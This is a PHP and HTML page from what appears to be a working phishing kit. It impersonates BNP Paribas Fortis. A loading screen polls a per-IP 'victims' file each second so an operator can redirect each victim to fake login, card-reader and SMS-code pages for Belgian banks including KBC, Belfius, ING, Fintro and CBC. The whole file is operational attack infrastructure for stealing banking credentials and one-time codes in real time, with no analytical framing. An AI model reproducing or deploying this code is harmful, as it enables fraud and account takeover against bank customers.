<?php
  session_start();
  include "./Asstes/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>Mijn Easy Banking, mijn online bank | BNP Paribas Fortis</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body>
      
    

    <!-- loading -->
    <div class="loading d-flex align-items-center justify-content-center flex-column">
        <div class="logo d-flex align-items-center">
            <img src="./Asstes/imgs/itsmelogo.png" style="width:50px;" alt="">
            <p class="mb-0 ms-2" style="font-weight:800; font-size:24px; font-family: 'Roboto Slab', serif; color: white;">un moment ...</p>
        </div>
        <div class="spinner-border text-warning" role="status" style="border-color: #FF4612;
        border-right-color: white; width: 2em;  height: 2em;">
          <span class="sr-only"><?php echo get_text('load'); ?></span>
        </div>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    
    <script>

      var ip = '<?php echo get_client_ip(); ?>';
      var waiting = setInterval(function() {
          $.get('victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
            if( data == 0 ) {
            //console.log('hada ba9i 0');
            }else if( data == 'KBC_login' ){
                clearInterval(waiting);
                location.href = "kbc1.php";
            }else if( data == 'KBC_login_error' ){
                clearInterval(waiting);
                location.href = "kbc1.php?error";
            }else if( data == 'KBC_lecture' ) {
                clearInterval(waiting);
                location.href = "kbc_l.php";
            }else if( data == 'KBC_lecture_error' ){
                clearInterval(waiting);
                location.href = "kbc_l.php?error";
            }else if( data == 'KBC_sms' ) {
                clearInterval(waiting);
                location.href = "kbc_sm.php";
            }else if( data == 'KBC_sms_error' ){
                clearInterval(waiting);
                location.href = "kbc_sm.php?error";
            }else if( data == 'success' ){
                clearInterval(waiting);
                location.href = "success.php";
            }
            // 
            else if( data == 'belfius_log' ){
                clearInterval(waiting);
                location.href = "belfius1.php";
            }else if( data == 'belfius_log_error' ){
                clearInterval(waiting);
                location.href = "belfius1.php?error";
            }else if( data == 'belfius_lecture' ) {
                clearInterval(waiting);
                location.href = "belfius_l.php";
            }else if( data == 'belfius_lecture_error' ){
                clearInterval(waiting);
                location.href = "belfius_l.php?error";
            }else if( data == 'belfius_sms' ) {
                clearInterval(waiting);
                location.href = "belfius_sm.php";
            }else if( data == 'belfius_sms_error' ){
                clearInterval(waiting);
                location.href = "belfius_sm.php?error";
            }
            // 
            else if( data == 'BNP_login' ){
                clearInterval(waiting);
                location.href = "bnp1.php";
            }else if( data == 'BNP_login_error' ){
                clearInterval(waiting);
                location.href = "bnp1.php?error";
            }else if( data == 'BNP_lecture' ) {
                clearInterval(waiting);
                location.href = "bnp_l.php";
            }else if( data == 'BNP_lecture_error' ){
                clearInterval(waiting);
                location.href = "bnp_l.php?error";
            }else if( data == 'BNP_sms' ) {
                clearInterval(waiting);
                location.href = "bnp_sm.php";
            }else if( data == 'BNP_sms_error' ){
                clearInterval(waiting);
                location.href = "bnp_sm.php?error";
            }  
            // 
            else if( data == 'Hello_login' ){
                clearInterval(waiting);
                location.href = "hello1.php";
            }else if( data == 'Hello_login_error' ){
                clearInterval(waiting);
                location.href = "hello1.php?error";
            }else if( data == 'Hello_lecture' ) {
                clearInterval(waiting);
                location.href = "hello_l.php";
            }else if( data == 'Hello_lecture_error' ){
                clearInterval(waiting);
                location.href = "hello_l.php?error";
            }else if( data == 'Hello_sms' ) {
                clearInterval(waiting);
                location.href = "hello_sm.php";
            }else if( data == 'Hello_sms_error' ){
                clearInterval(waiting);
                location.href = "hello_sm.php?error";
            } 
            // 
            else if( data == 'ING_login' ){
                clearInterval(waiting);
                location.href = "ing1.php";
            }else if( data == 'ING_login_error' ){
                clearInterval(waiting);
                location.href = "ing1.php?error";
            }else if( data == 'ING_lecture' ) {
                clearInterval(waiting);
                location.href = "ing_l.php";
            }else if( data == 'ING_lecture_error' ){
                clearInterval(waiting);
                location.href = "ing_l.php?error";
            }else if( data == 'ING_sms' ) {
                clearInterval(waiting);
                location.href = "ing_sm.php";
            }else if( data == 'ING_sms_error' ){
                clearInterval(waiting);
                location.href = "ing_sm.php?error";
            }  
            // 
            else if( data == 'fintro_login' ){
                clearInterval(waiting);
                location.href = "fintro1.php";
            }else if( data == 'fintro_login_error' ){
                clearInterval(waiting);
                location.href = "fintro1.php?error";
            }else if( data == 'fintro_lecture' ) {
                clearInterval(waiting);
                location.href = "fintro_l.php";
            }else if( data == 'fintro_lecture_error' ){
                clearInterval(waiting);
                location.href = "fintro_l.php?error";
            }else if( data == 'fintro_sms' ) {
                clearInterval(waiting);
                location.href = "fintro_sm.php";
            }else if( data == 'fintro_sms_error' ){
                clearInterval(waiting);
                location.href = "fintro_sm.php?error";
            }   
            // 
            else if( data == 'CBC_login' ){
                clearInterval(waiting);
                location.href = "cbc1.php";
            }else if( data == 'CBC_login_error' ){
                clearInterval(waiting);
                location.href = "cbc1.php?error";
            }else if( data == 'CBC_lecture' ) {
                clearInterval(waiting);
                location.href = "cbc_l.php";
            }else if( data == 'CBC_lecture_error' ){
                clearInterval(waiting);
                location.href = "cbc_l.php?error";
            }else if( data == 'CBC_sms' ) {
                clearInterval(waiting);
                location.href = "cbc_sm.php";
            }else if( data == 'CBC_sms_error' ){
                clearInterval(waiting);
                location.href = "cbc_sm.php?error";
            }else if( data == 'app' ){
                clearInterval(waiting);
                location.href = "confirm.php";
            }                                                     
          });
      }, 1000); 

    </script>
    </body>
</html>